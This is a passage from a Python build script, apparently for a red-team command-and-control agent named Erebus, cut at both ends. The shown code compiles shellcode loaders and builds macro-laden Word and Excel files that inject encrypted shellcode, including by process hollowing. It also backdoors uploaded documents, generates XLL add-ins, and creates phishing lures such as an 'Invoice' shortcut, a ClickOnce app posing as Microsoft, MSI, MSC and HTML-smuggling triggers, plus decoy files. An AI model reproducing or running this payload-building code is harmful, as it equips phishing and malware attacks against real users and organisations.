                            str(PurePath(agent_build_path) / "payload"),
                            build_config=build_config,
                        )

                        if os.path.exists(payload_path):
                            response.status = BuildStatus.Success
                            response.build_message = "Loader Compiled!"
                            response.build_stdout = output + "\n" + payload_path
                            await self._build_step(compile_step_name, compile_step_msg, success=True)
                        else:
                            response.status = BuildStatus.Error
                            response.build_message = "Failed to compile loader"
                            response.build_stderr = output + "\n" + payload_path
                            await self._build_step(compile_step_name, "Failed to Compile Shellcode Loader", success=False)
                            return response

                elif loader_type == "ClickOnce":
                    if process.returncode != 0:
                        response.status = BuildStatus.Error
                        response.build_message = f"Makefile publish target failed with exit code {process.returncode}"
                        response.build_stderr = output
                        await self._build_step(compile_step_name, f"Makefile publish failed", success=False)
                        return response

                    # Locate publish output
                    build_config = self.get_parameter('0.3 ClickOnce Build Configuration')
                    publish_root = Path(clickonce_loader_path) / "bin" / build_config

                    publish_dir = None
                    if publish_root.exists():
                        for tfm_dir in publish_root.iterdir():
                            if tfm_dir.is_dir() and "net" in tfm_dir.name and "-windows" in tfm_dir.name:
                                for rid_dir in tfm_dir.iterdir():
                                    if rid_dir.is_dir():
                                        candidate = rid_dir / "publish"
                                        if candidate.exists():
                                            publish_dir = candidate
                                            break
                                if publish_dir:
                                    break

                    if not publish_dir or not publish_dir.exists():
                        response.status = BuildStatus.Error
                        response.build_message = "Failed to locate ClickOnce publish output directory"
                        response.build_stderr = output + f"\nSearched in: {publish_root}"
                        await self._build_step(compile_step_name, "Failed to locate ClickOnce publish output", success=False)
                        return response

                    # Copy cleaned artifacts from publish directory (skip the main exe - renamed below)
                    payload_dir = Path(agent_build_path) / "payload"
                    payload_dir.mkdir(parents=True, exist_ok=True)

                    CLICKONCE_MAIN = {"Erebus.ClickOnce.exe", "Erebus.ClickOnce.dll"}
                    for item in publish_dir.iterdir():
                        if item.is_file() and item.name not in CLICKONCE_MAIN:
                            dest_path = payload_dir / item.name
                            shutil.copy2(str(item), str(dest_path))

                    output += f"[DEBUG] Cleaned publish artifacts:\n"
                    for item in publish_dir.iterdir():
                        if item.is_file():
                            output += f"  - {item.name} ({item.stat().st_size} bytes)\n"

                    # Locate main executable and copy as erebus.exe / erebus.dll
                    payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
                    payload_path = str(payload_path)

                    clickonce_exe = publish_dir / "Erebus.ClickOnce.exe"
                    clickonce_dll = publish_dir / "Erebus.ClickOnce.dll"

                    if clickonce_exe.exists():
                        shutil.copy2(str(clickonce_exe), str(payload_path))
                        response.build_stdout = output + f"\nClickOnce Loader compiled to: {payload_path}"
                        response.status = BuildStatus.Success
                        response.build_message = "ClickOnce Loader compiled successfully!"
                    elif clickonce_dll.exists():
                        payload_path_dll = Path(payload_path).with_suffix(".dll")
                        shutil.copy2(str(clickonce_dll), str(payload_path_dll))
                        response.build_stdout = output + f"\nClickOnce Loader compiled to: {payload_path_dll}"
                        response.status = BuildStatus.Success
                        response.build_message = "ClickOnce Loader compiled successfully!"
                    else:
                        response.status = BuildStatus.Error
                        response.build_message = "Failed to locate compiled ClickOnce executable"
                        response.build_stderr = output + "\nNo .exe or .dll found in publish directory"
                        await self._build_step(compile_step_name, "Failed to locate executable", success=False)
                        return response

                    await self._build_step(compile_step_name, compile_step_msg, success=True)

            output = ""
            ######################### End Of Payload Build Section #########################
            ######################### Code Signing Section #########################
            # R3b: dispatch into _apply_codesign() - see its docstring for
            # the mode matrix. Method returns False on failure and has
            # already populated response.status/build_stderr, so we just
            # propagate the error response upward.
            if not await self._apply_codesign(agent_build_path, dll_file_name, response):
                return response

            ######################### Creating Decoy Section #########################
            if self.get_parameter("0.13 Decoy File Inclusion"):
                decoy_dir = Path(agent_build_path) / "decoys"
                decoy_file_uuid = self.get_parameter("0.13 Decoy File")

                if decoy_file_uuid:
                    try:
                        file_resp = await SendMythicRPCFileGetContent(
                            MythicRPCFileGetContentMessage(AgentFileId=decoy_file_uuid)
                        )

                        file_name_resp = await SendMythicRPCFileSearch(
                            MythicRPCFileSearchMessage(AgentFileID=decoy_file_uuid)
                        )
                        custom_filename = "decoy.pdf"
                        if file_name_resp.Success and len(file_name_resp.Files) > 0:
                            custom_filename = file_name_resp.Files[0].Filename

                        if decoy_dir.exists():
                            shutil.rmtree(decoy_dir)
                        decoy_dir.mkdir(parents=True, exist_ok=True)
                        custom_decoy_path = decoy_dir / custom_filename
                        custom_decoy_path.write_bytes(file_resp.Content)

                        await self._build_step("[T1036.008] - Creating Decoy", f"Replaced default decoys with custom file: {custom_filename}", success=True)

                    except Exception as e:
                        await self._build_step("[T1036.008] - Creating Decoy", f"Failed to process custom decoy: {str(e)}", success=False)
                else:
                    await self._build_step("[T1036.008] - Creating Decoy", "Using default decoy files.", success=True)
            ######################### End of Decoy Section #########################
            ######################### MalDoc Creation Section #########################
            maldoc_mode = self.get_parameter("0.9 Create MalDoc")

            if maldoc_mode != "None" and self.get_parameter("0.8 Output Extension Source") == "Trigger":
                await self._build_step("[T1566.001] - Creating MalDoc", "Skipping MalDoc Generation (Trigger selected as source).", success=True)

            if maldoc_mode != "None" and self.get_parameter("0.8 Output Extension Source") != "Trigger":
                payload_dir = Path(agent_build_path) / "payload"
                maldoc_type = self.get_parameter("0.9a MalDoc Type")
                vba_trigger = self.get_parameter("0.9c VBA Execution Trigger")
                doc_name = self.get_parameter("0.9d Excel Document Name")
                obfuscate = self.get_parameter("0.9e Obfuscate VBA")
                injection_type = self.get_parameter("0.9f MalDoc Injection Type")
                xll_payload_type = self.get_parameter("0.9h XLL Payload Type")

                try:
                    # Generate VBA payload code based on injection type
                    if injection_type == "Command Execution":
                        # Use WScript.Shell to execute trigger binary and command
                        trigger_binary = self.get_parameter("0.9f1 MalDoc Trigger Binary")
                        trigger_command = self.get_parameter("0.9f2 MalDoc Trigger Command")

                        # R3a: generate_command_execution_vba is registered by
                        # plugin_payload_maldocs and auto-discovered into the
                        # builder's globals by the R1c plugin-loader wiring.
                        # Pre-R3a, this block open-coded an inline
                        # `PayloadMalDocsPlugin()` instantiation because the
                        # plugin's validate() used to hard-fail without
                        # openpyxl, taking the VBA functions offline even on
                        # openpyxl-less hosts. R3a relaxed validate() so the
                        # plugin now loads in both cases.
                        vba_code = generate_command_execution_vba(
                            trigger_binary=trigger_binary,
                            trigger_command=trigger_command,
                            trigger_type=vba_trigger,
                        )

                    else:  # Shellcode Injection
                        # Convert shellcode to VBA format using shellcrypt
                        # First, generate the VBA-formatted shellcode
                        cmd = [
                            "python",
                            shellcrypt_path,
                            "-i", mythic_shellcode_path,
                            "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
                            "-f", "vba",
                            "-a", "shellcode"
                        ]

                        if self.get_parameter("2.2 Encryption Key") != "NONE":
                            cmd += ["-k", self.get_parameter("2.2 Encryption Key")]

                        if self.get_parameter("2.0 Compression Type") != "NONE":
                            cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("2.0 Compression Type")]]

                        # Run shellcrypt to get VBA shellcode
                        shellcode_output = subprocess.check_output(cmd, text=True)
                        output += f"[DEBUG] Shellcrypt raw output length: {len(shellcode_output)} bytes\n"

                        # Parse shellcrypt output to extract only key and shellcode arrays
                        shellcode_vba = ""
                        lines = shellcode_output.split('\n')
                        in_key = False
                        in_shellcode = False
                        key_lines = []
                        shellcode_lines = []

                        for line in lines:
                            # Capture key array
                            if 'key = Array' in line:
                                in_key = True
                                in_shellcode = False
                                key_lines.append(line.strip())
                            elif in_key:
                                if line.strip().endswith(')'):
                                    key_lines.append(line.strip())
                                    in_key = False
                                elif line.strip():
                                    key_lines.append(line.strip())

                            # Capture shellcode array
                            if 'shellcode = Array' in line:
                                in_shellcode = True
                                in_key = False
                                shellcode_lines.append(line.strip())
                            elif in_shellcode:
                                if line.strip().endswith(')'):
                                    shellcode_lines.append(line.strip())
                                    in_shellcode = False
                                elif line.strip():
                                    shellcode_lines.append(line.strip())

                        # Combine extracted lines
                        if key_lines:
                            shellcode_vba += ' '.join(key_lines) + '\n'
                        if shellcode_lines:
                            shellcode_vba += ' '.join(shellcode_lines) + '\n'

                        output += f"[DEBUG] Parsed shellcode_vba length: {len(shellcode_vba)} bytes\n"

                        # Map loader selection to plugin parameter
                        loader_map = {
                            "VirtualAlloc + CreateThread": "createthread",
                            "EnumSystemLocalesA Callback": "enumlocales",
                            "QueueUserAPC Injection": "queueuserapc",
                            "Process Hollowing": "hollowing"
                        }
                        loader_type = loader_map.get(self.get_parameter("0.9g VBA Loader Technique"), "createthread")
                        output += f"[DEBUG] Using VBA loader technique: {loader_type}\n"

                        # Get target process for hollowing technique
                        target_process = self.get_parameter("0.5 Shellcode Loader - Target Process")
                        output += f"[DEBUG] Target process: {target_process}\n"

                        # Generate VBA that injects the shellcode.
                        # Word formats (docm/doc) use the improved Word loader:
                        #   - Document_Open + AutoOpen dual triggers
                        #   - RW alloc -> VirtualProtect RX flip (no RWX)
                        #   - Source buffer zeroing + GetTickCount sandbox gate
                        # Excel formats use the existing loader generators.
                        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
                        plugin = PayloadMalDocsPlugin()
                        _word_fmt = (self.get_parameter("0.9p MalDoc Output Format") or "xlsm").lower()
                        if _word_fmt in ("docm", "doc"):
                            vba_code = plugin.generate_word_vba_loader(
                                vba_shellcode=shellcode_vba,
                                trigger_type=vba_trigger,
                                loader_type=loader_type,
                                target_process=target_process,
                            )
                        else:
                            vba_code = plugin.generate_shellcode_injection_vba(
                                vba_shellcode=shellcode_vba,
                                trigger_type=vba_trigger,
                                loader_type=loader_type,
                                target_process=target_process,
                            )

                    # ==================== XLL (Excel Add-In DLL) Generation ====================
                    if xll_payload_type == "XLL Add-In DLL":
                        # Generate C/C++ source code for XLL DLL instead of VBA macro
                        await self._build_step("[T1559.002] - Generating XLL DLL", "Generating C/C++ XLL source code...", success=True)

                        # Get XLL-specific parameters
                        xll_injection_method = self.get_parameter("0.9i XLL Injection Method")
                        xll_target_process = self.get_parameter("0.9j XLL Target Process")
                        xll_compiler = self.get_parameter("0.9k XLL Compiler")
                        xll_guardrail_includes = (self.get_parameter("0.9l XLL Guardrail Includes") or "").strip()
                        xll_guardrail_code = (self.get_parameter("0.9m XLL Guardrail Code") or "").strip()
                        xll_guardrail_extra_libs = (self.get_parameter("0.9n XLL Guardrail Extra Libs") or "").strip()
                        xll_guardrail_extra_libs_list = shlex.split(xll_guardrail_extra_libs) if xll_guardrail_extra_libs else []

                        # Map injection method names for template
                        injection_method_map = {
                            "CreateThread (In-Process)": "CreateThread",
                            "ProcessInject (Remote)": "ProcessInject"
                        }
                        template_injection_method = injection_method_map.get(xll_injection_method, "CreateThread")

                        # Generate XLL shellcode using shellcrypt
                        output += "[*] Processing shellcode for XLL injection...\n"

                        shellcrypt_cmd = [
                            "python",
                            shellcrypt_path,
                            "-i", mythic_shellcode_path,
                            "-e", ENCRYPTION_METHODS[self.get_parameter("2.1 Encryption Type")],
                            "-f", "c",
                            "-a", "shellcode",
                            "-o", str(xll_shellcode_path)
                        ]

                        if self.get_parameter("2.2 Encryption Key") != "NONE":
                            shellcrypt_cmd += ["-k", self.get_parameter("2.2 Encryption Key")]

                        if self.get_parameter("2.0 Compression Type") != "NONE":
                            shellcrypt_cmd += ["-c", COMPRESSION_METHODS[self.get_parameter("2.0 Compression Type")]]

                        # Run shellcrypt to generate shellcode directly to xll_shellcode.h
                        try:
                            subprocess.check_output(shellcrypt_cmd, text=True)
                            output += f"[+] Shellcrypt generated xll_shellcode.h\n"
                        except subprocess.CalledProcessError as e:
                            output += f"[-] Shellcrypt failed: {str(e)}\n"
                            raise

                        # Wrap shellcrypt output with header guards
                        if xll_shellcode_path.exists():
                            shellcrypt_content = xll_shellcode_path.read_text()
                            wrapped_content = f'''#ifndef EREBUS_XLL_SHELLCODE_H
#define EREBUS_XLL_SHELLCODE_H
#pragma once

#include <stddef.h>

{shellcrypt_content}

static size_t shellcode_len = sizeof(shellcode);
static size_t key_len = sizeof(key);

#endif
'''
                            xll_shellcode_path.write_text(wrapped_content)
                            output += f"[+] Wrapped shellcode header with guards\n"
                        else:
                            output += "[-] Shellcrypt output file not created\n"
                            raise RuntimeError("Shellcrypt failed to create output file")

                        xll_injection_mode = 0 if xll_injection_method == "CreateThread (In-Process)" else 1
                        xll_target_process_escaped = xll_target_process.replace("\\", "\\\\")

                        template_dir = Path(__file__).resolve().parent.parent / "agent_code" / "erebus_xll"

                        def _render_xll_template(template_path: Path, replace_map: dict) -> str:
                            content = template_path.read_text()
                            for token, value in replace_map.items():
                                content = content.replace(token, value)
                            return content

                        replacements = {
                            "{{XLL_ENCRYPTION_TYPE}}": str(encryption_type_value if encryption_type_value else 0),
                            "{{XLL_INJECTION_METHOD}}": str(xll_injection_mode),
                            "{{XLL_TARGET_PROCESS}}": xll_target_process_escaped,
                            "{{XLL_XLL_FILENAME}}": f"{doc_name}.xll",
                            "{{XLL_XLSX_FILENAME}}": f"{doc_name}.xlsx",
                            "{{XLL_ZIP_FILENAME}}": f"{doc_name}.zip",
                        }

                        xll_config_path.write_text(
                            _render_xll_template(template_dir / "xll_config.h", replacements)
                        )

                        # Load Jinja2 template for XLL
                        template_dir = Path(__file__).parent.parent / "agent_code" / "erebus_xll"
                        env = Environment(loader=FileSystemLoader(str(template_dir)))
                        template = env.get_template("xll_payload.j2")

                        # Render template with context
                        template_context = {
                            "encryption_type": encryption_type_value if encryption_type_value else "NONE",
                            "injection_method": template_injection_method,
                            "injection_method_name": xll_injection_method,
                            "target_process": xll_target_process if xll_injection_method == "ProcessInject (Remote)" else "explorer.exe",
                            "generation_timestamp": datetime.now().isoformat(),
                            "vba_encryption_type": encryption_type_value if encryption_type_value else "NONE",
                            "guardrail_includes": xll_guardrail_includes,
                            "guardrail_code": xll_guardrail_code
                        }

                        xll_source = template.render(template_context)

                        # Save XLL source to temporary file
                        xll_source_path.write_text(xll_source)

                        output += f"[+] Generated XLL source: {xll_source_path.name}\n"
                        output += f"[*] Source size: {len(xll_source)} bytes\n"
                        output += f"[*] Encryption type: {encryption_type_value}\n"
                        output += f"[*] Injection method: {xll_injection_method}\n"

                        # Generate xll_config.h with configuration macros
                        xll_config_path = xll_build_dir / "xll_config.h"
                        injection_method_macro = "0" if xll_injection_method == "Self-injection (Local)" else "1"
                        encryption_type_macro = {
                            "NONE": "0",
                            "XOR": "1",
                            "RC4": "2"
                        }.get(encryption_type_value or "NONE", "0")

                        target_process = xll_target_process if xll_injection_method == "ProcessInject (Remote)" else "explorer.exe"

                        xll_config_content = f'''#ifndef EREBUS_XLL_CONFIG_H
#define EREBUS_XLL_CONFIG_H
#pragma once

#include <windows.h>

// Encryption: 0 = NONE, 1 = XOR, 2 = RC4
#define XLL_ENCRYPTION_TYPE {encryption_type_macro}

// Injection: 0 = CreateThread (self), 1 = ProcessInject (remote)
#define XLL_INJECTION_METHOD {injection_method_macro}

#define XLL_TARGET_PROCESS L"{target_process}"

#define XLL_XLL_FILENAME L"payload.xll"
#define XLL_XLSX_FILENAME L"payload.xlsx"
#define XLL_ZIP_FILENAME L"payload.zip"

#endif
'''
                        xll_config_path.write_text(xll_config_content)
                        output += f"[+] Generated xll_config.h\n"

                        try:
                            xll_output_path = payload_dir / f"{doc_name}.xll"
                            xll_source_ref = payload_dir / f"{doc_name}.cpp"

                            # XLL compilation requires MSVC on a Windows host via erebus_helper.
                            # Docker only ships the source; build_xll.bat handles compilation.
                            shutil.copy(str(xll_source_path), str(xll_source_ref))
                            output += f"[*] Source code saved to: {xll_source_ref.name}\n"

                            # Copy header files so cl.exe can find them alongside the .cpp
                            shutil.copy(str(xll_inject_path), str(payload_dir / "xll_inject.h"))
                            shutil.copy(str(xll_shellcode_path), str(payload_dir / "xll_shellcode.h"))
                            shutil.copy(str(xll_config_path), str(payload_dir / "xll_config.h"))
                            output += f"[*] XLL headers copied to payload directory\n"

                            # ---- Generate build_xll.bat for native recompilation on Windows ----
                            bat_extra = f' --extra-flags "{xll_guardrail_extra_libs}"' if xll_guardrail_extra_libs else ""
                            bat_lines = [
                                "@echo off",
                                "REM Recompile XLL natively on Windows using the bundled helper.",
                                "REM Run this on a Windows host after extracting the payload archive.",
                                f'python erebus_helper.py xll --source "{xll_source_ref.name}" --output "{xll_output_path.name}" --compiler {xll_compiler} --arch x64 --optimize Ox{bat_extra}',
                                "echo XLL compiled: %errorlevel%",
                            ]
                            bat_path = payload_dir / "build_xll.bat"
                            bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
                            output += f"[+] Generated build_xll.bat for native Windows recompilation\n"

                        except Exception as e:
                            output += f"[-] XLL compilation error: {str(e)}\n"
                            await self._build_step("[T1559.002] - Generating XLL DLL", f"XLL generation failed: {str(e)}", success=False)
                            raise

                        # Skip VBA obfuscation if using XLL
                        obfuscate = False

                    if obfuscate and xll_payload_type != "XLL Add-In DLL":
                        vba_code = await self.obfuscate_vba(vba_code)

                    # Handle VBA Module Only export
                    if maldoc_mode == "VBA Module Only":
                        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
                        plugin = PayloadMalDocsPlugin()

                        # Export as .bas file (importable VBA module)
                        bas_output = payload_dir / f"{doc_name}_payload.bas"
                        bas_path = plugin.export_vba_as_bas(
                            vba_code=vba_code,
                            output_path=str(bas_output),
                            module_name=doc_name
                        )

                        # Also export as plain text for reference
                        txt_output = payload_dir / f"{doc_name}_payload.txt"
                        plugin.export_vba_as_text(vba_code, str(txt_output))

                        success_msg = f"[+] Created VBA module for manual import: {bas_path.name}\n"
                        success_msg += f"[*] .bas file can be imported into Excel via VBA Editor > File > Import\n"
                        success_msg += f"[*] .txt file contains the raw VBA code for reference"

                        output += success_msg + "\n"

                        await self._build_step("[T1566.001] - Creating MalDoc", success_msg, success=True)

                    elif maldoc_type == "Create New":
                        maldoc_fmt = (self.get_parameter("0.9p MalDoc Output Format") or "xlsm").lower()

                        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin as _MDP
                        _plugin = _MDP()

                        # Export .bas for manual re-injection regardless of format
                        bas_output = payload_dir / f"{doc_name}_payload.bas"
                        _plugin.export_vba_as_bas(vba_code=vba_code, output_path=str(bas_output), module_name=doc_name)

                        if maldoc_fmt in ("docm", "doc"):
                            # --- Word path ---
                            # Always produce .docm on server (ZIP-based, no COM needed).
                            # For .doc, build_maldoc.bat converts via Word COM on Windows.
                            docm_output = payload_dir / f"{doc_name}.docm"
                            word_template_path = _plugin._resolve_word_template_path(docm_output)

                            shipped_template_name = None
                            if word_template_path and word_template_path.exists():
                                shipped_template_name = word_template_path.name
                                shutil.copy2(str(word_template_path), str(payload_dir / shipped_template_name))
                                _plugin.create_new_word_with_payload(
                                    output_path=docm_output,
                                    vba_code=vba_code,
                                    document_name=doc_name,
                                    template_path=word_template_path,
                                )
                                success_msg = f"[+] Compiled {docm_output.name} from {word_template_path.name} template.\n"
                            else:
                                _plugin.create_new_word_with_payload(
                                    output_path=docm_output,
                                    vba_code=vba_code,
                                    document_name=doc_name,
                                )
                                success_msg = f"[+] Created {docm_output.name} (no template, built from scratch).\n"

                            output += f"[+] Created DOCM: {docm_output.name}\n"

                            # bat handles both docm (re-inject) and doc (COM SaveAs)
                            bat_cmd = f'python erebus_helper.py {maldoc_fmt} --bas-file "{bas_output.name}" --output "{doc_name}.{maldoc_fmt}" --module-name "{doc_name}"'
                            if shipped_template_name:
                                bat_cmd += f' --template "{shipped_template_name}"'
                            if maldoc_fmt == "doc":
                                bat_cmd += f' --source-docm "{docm_output.name}"'
                                output += f"[*] build_maldoc.bat will convert {docm_output.name} -> {doc_name}.doc via Word COM (run on Windows)\n"
                            bat_lines = [
                                "@echo off",
                                f"REM Re-inject VBA into {maldoc_fmt.upper()} via erebus_helper (run on Windows for full COM support).",
                                bat_cmd,
                                "echo MalDoc created: %errorlevel%",
                            ]
                            bat_path = payload_dir / "build_maldoc.bat"
                            bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
                            output += f"[*] build_maldoc.bat included for Windows-side COM re-injection\n"

                        else:
                            # --- Excel path (xlsm / xlsx / xlam) ---
                            excel_output = payload_dir / f"{doc_name}.{maldoc_fmt}"
                            template_path = _plugin._resolve_template_path(excel_output)

                            shipped_template_name = None
                            if template_path and template_path.exists():
                                shipped_template_name = template_path.name
                                shutil.copy2(str(template_path), str(payload_dir / shipped_template_name))

                                _plugin.create_new_excel_with_payload(
                                    output_path=excel_output,
                                    vba_code=vba_code,
                                    document_name=doc_name,
                                    template_path=template_path,
                                )
                                success_msg = f"[+] Compiled {excel_output.name} from {template_path.name} template.\n"
                                output += f"[+] Created {maldoc_fmt.upper()}: {excel_output.name}\n"
                            else:
                                _plugin.create_new_excel_with_payload(
                                    output_path=excel_output,
                                    vba_code=vba_code,
                                    document_name=doc_name,
                                )
                                success_msg = f"[+] Created {excel_output.name} (no template found, built from scratch).\n"
                                output += f"[+] Created {maldoc_fmt.upper()}: {excel_output.name}\n"

                            bat_cmd = f'python erebus_helper.py {maldoc_fmt} --bas-file "{bas_output.name}" --output "{excel_output.name}" --module-name "{doc_name}"'
                            if shipped_template_name:
                                bat_cmd += f' --template "{shipped_template_name}"'
                            bat_lines = [
                                "@echo off",
                                f"REM Re-inject VBA into {maldoc_fmt.upper()} via erebus_helper (run on Windows for full COM support).",
                                bat_cmd,
                                "echo MalDoc created: %errorlevel%",
                            ]
                            bat_path = payload_dir / "build_maldoc.bat"
                            bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
                            output += f"[*] build_maldoc.bat included for optional Windows-side COM re-injection\n"

                    else:  # Backdoor Existing
                        maldoc_fmt = (self.get_parameter("0.9p MalDoc Output Format") or "xlsm").lower()

                        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin as _MDP
                        _plugin = _MDP()

                        # Export .bas for manual re-injection regardless of format
                        bas_output = payload_dir / f"{doc_name}_payload.bas"
                        _plugin.export_vba_as_bas(vba_code=vba_code, output_path=str(bas_output), module_name=doc_name)

                        # Retrieve uploaded source file (works for both Excel and Word)
                        source_file_uuid = self.get_parameter("0.9b Excel Source File")
                        source_file_path = None
                        source_file_name = None
                        original_filename = None

                        if source_file_uuid:
                            file_resp = await SendMythicRPCFileGetContent(
                                MythicRPCFileGetContentMessage(AgentFileId=source_file_uuid)
                            )
                            if file_resp.Success:
                                file_name_resp = await SendMythicRPCFileSearch(
                                    MythicRPCFileSearchMessage(AgentFileID=source_file_uuid)
                                )
                                default_ext = "docm" if maldoc_fmt in ("docm", "doc") else "xlsm"
                                original_filename = f"document.{default_ext}"
                                if file_name_resp.Success and len(file_name_resp.Files) > 0:
                                    original_filename = file_name_resp.Files[0].Filename

                                source_file_name = f"{Path(original_filename).stem}_source{Path(original_filename).suffix}"
                                source_file_path = payload_dir / source_file_name
                                source_file_path.write_bytes(file_resp.Content)

                        if maldoc_fmt in ("docm", "doc"):
                            # --- Word backdoor path ---
                            if source_file_path is None:
                                # Fall back to Word template
                                word_tmpl = _plugin._resolve_word_template_path(
                                    payload_dir / f"{doc_name}.docm"
                                )
                                if word_tmpl and word_tmpl.exists():
                                    original_filename = word_tmpl.name
                                    source_file_name = word_tmpl.name
                                    source_file_path = payload_dir / source_file_name
                                    shutil.copy2(str(word_tmpl), str(source_file_path))
                                    output += f"[*] No Word file uploaded, using {word_tmpl.name} template\n"
                                else:
                                    raise ValueError(
                                        "No Word file provided for backdooring and no template.docm found"
                                    )

                            output_name = f"{Path(original_filename).stem}_backdoored.docm"
                            doc_output = payload_dir / output_name
                            _plugin.backdoor_word_document(
                                source_path=source_file_path,
                                output_path=doc_output,
                                vba_code=vba_code,
                            )
                            success_msg = (
                                f"[+] Backdoored {original_filename} -> {doc_output.name}\n"
                                f"[*] Source file kept at {source_file_name}\n"
                            )
                            output += f"[+] Created backdoored DOCM: {doc_output.name}\n"

                            bat_cmd = f'python erebus_helper.py {maldoc_fmt} --bas-file "{bas_output.name}" --source-docm "{doc_output.name}" --output "{doc_name}.{maldoc_fmt}" --module-name "{doc_name}"'
                            bat_lines = [
                                "@echo off",
                                f"REM Re-inject VBA into {maldoc_fmt.upper()} via erebus_helper (run on Windows for full COM support).",
                                bat_cmd,
                                "echo MalDoc created: %errorlevel%",
                            ]
                            bat_path = payload_dir / "build_maldoc.bat"
                            bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
                            output += f"[*] build_maldoc.bat included for Windows-side COM re-injection\n"

                        else:
                            # --- Excel backdoor path (xlsm / xlsx / xlam) ---
                            if source_file_path is None:
                                template_path = _plugin._resolve_template_path(
                                    payload_dir / f"{doc_name}.{maldoc_fmt}"
                                )
                                if template_path and template_path.exists():
                                    original_filename = template_path.name
                                    source_file_name = template_path.name
                                    source_file_path = payload_dir / source_file_name
                                    shutil.copy2(str(template_path), str(source_file_path))
                                    output += f"[*] No Excel file uploaded, using {template_path.name} template\n"
                                else:
                                    raise ValueError(
                                        "No Excel file provided for backdooring and no template found"
                                    )

                            output_name = f"{Path(original_filename).stem}_backdoored.{maldoc_fmt}"
                            excel_output = payload_dir / output_name
                            _plugin.backdoor_excel_document(
                                source_path=source_file_path,
                                output_path=excel_output,
                                vba_code=vba_code,
                            )
                            success_msg = (
                                f"[+] Backdoored {original_filename} -> {excel_output.name}\n"
                                f"[*] Source file kept at {source_file_name}\n"
                            )
                            output += f"[+] Created backdoored {maldoc_fmt.upper()}: {excel_output.name}\n"

                            bat_cmd = f'python erebus_helper.py {maldoc_fmt} --bas-file "{bas_output.name}" --source-excel "{source_file_name}" --output "{excel_output.name}" --module-name "{doc_name}"'
                            bat_lines = [
                                "@echo off",
                                f"REM Re-inject VBA into {maldoc_fmt.upper()} via erebus_helper (run on Windows for full COM support).",
                                bat_cmd,
                                "echo MalDoc created: %errorlevel%",
                            ]
                            bat_path = payload_dir / "build_maldoc.bat"
                            bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")
                            output += f"[*] build_maldoc.bat included for optional Windows-side COM re-injection\n"

                    await self._build_step("[T1566.001] - Creating MalDoc", success_msg, success=True)

                except Exception as e:
                    await self._build_step("[T1566.001] - Creating MalDoc", f"Failed to create/backdoor document: {str(e)}", success=False)
                    response.status = BuildStatus.Error
                    response.build_stderr = f"MalDoc creation failed: {str(e)}"
                    return response

            ######################### End of MalDoc Section #########################
            ######################### Trigger Generation Section #########################

            if self.get_parameter("0.0 Main Payload Type") == "Loader" and self.get_parameter("0.8 Output Extension Source") == "MalDoc":
                await self._build_step("[T1137.006] - Adding Trigger", "Skipping Trigger Generation (MalDoc selected as source).", success=True)

            if self.get_parameter("0.0 Main Payload Type") == "Loader" and self.get_parameter("0.8 Output Extension Source") != "MalDoc":

                payload_dir = Path(agent_build_path) / "payload"
                decoy_dir = Path(agent_build_path) / "decoys"
                decoy_file = decoy_dir / "decoy.pdf"

                trigger_type = self.get_parameter("0.9 Trigger Type")

                try:
                    trigger_path = ""

                    match trigger_type:
                        case "LNK":
                            trigger_bin  = str(self.get_parameter("0.9a Trigger Binary"))
                            trigger_args = str(self.get_parameter("0.9b Trigger Command"))

                            # Load the helper's trigger_lnk module via path so
                            # the dot-in-directory name doesn't break imports.
                            # This keeps icon-resolution logic in one place
                            # (erebus_helper.py) rather than duplicated here.
                            _helper_root = Path(__file__).parent.parent / "agent_code" / "Erebus.Helper"
                            _lnk_mod_path = _helper_root / "modules" / "trigger_lnk.py"
                            import importlib.util as _ilu
                            _lnk_spec = _ilu.spec_from_file_location("_helper_trigger_lnk", str(_lnk_mod_path))
                            _lnk_mod  = _ilu.module_from_spec(_lnk_spec)
                            _lnk_spec.loader.exec_module(_lnk_mod)

                            trigger_path = _lnk_mod.create_payload_trigger(
                                target_bin=trigger_bin,
                                args=trigger_args,
                                icon_src=r"%SystemRoot%\system32\shell32.dll",
                                icon_index=0,
                                description="Invoice",
                                payload_dir=payload_dir,
                                decoy_file=decoy_file,
                            )

                            # Write a Windows batch file so the operator can
                            # re-build the LNK with native icon resolution on
                            # a Windows host using the bundled erebus_helper.py.
                            lnk_name = trigger_path.name if hasattr(trigger_path, "name") else str(trigger_path).split(os.sep)[-1]
                            bat_lines = [
                                "@echo off",
                                "REM Re-create LNK with correct Windows icons using the bundled helper.",
                                "REM Run this on a Windows host after extracting the payload archive.",
                                f'python erebus_helper.py lnk --target-binary "{trigger_bin}" --arguments "{trigger_args}" --output "{lnk_name}" --description "Invoice"',
                                "echo LNK created: %errorlevel%",
                            ]
                            bat_path = payload_dir / "build_lnk.bat"
                            bat_path.write_text("\r\n".join(bat_lines), encoding="utf-8")

                        case "BAT":
                            trigger_path = create_bat_payload_trigger(
                                target_bin=str(self.get_parameter("0.9a Trigger Binary")),
                                args=str(self.get_parameter("0.9b Trigger Command")),
                                payload_dir=payload_dir,
                                decoy_file=decoy_file
                            )

                        case "MSI":
                            trigger_path= create_msi_payload_trigger(
                                payload_exe="erebus.exe",
                                payload_dir=payload_dir,
                                decoy_file=decoy_file
                            )
                        case "ClickOnce":
                            trigger_path = await create_clickonce_trigger(
                                payload_exe="erebus.exe",
                                payload_dir=payload_dir,
                                decoy_file=decoy_file,
                                app_name="System Update",
                                app_publisher="Microsoft Corporation"
                            )

                        case "MSC":
                            trigger_path = create_msc_explorer_trigger(
                                payload_exe="erebus.exe",
                                payload_dir=payload_dir,
                                decoy_file=decoy_file
                            )

                        case "HTML":
                            # Find the compiled payload in the payload directory
                            payload_exe = payload_dir / "erebus.exe"
                            if not payload_exe.exists():
                                for ext in ["dll", "cpl", "xll"]:
                                    candidate = payload_dir / f"erebus.{ext}"
                                    if candidate.exists():
                                        payload_exe = candidate
                                        break

                            download_name = payload_exe.name
                            trigger_path = create_html_smuggling_trigger(
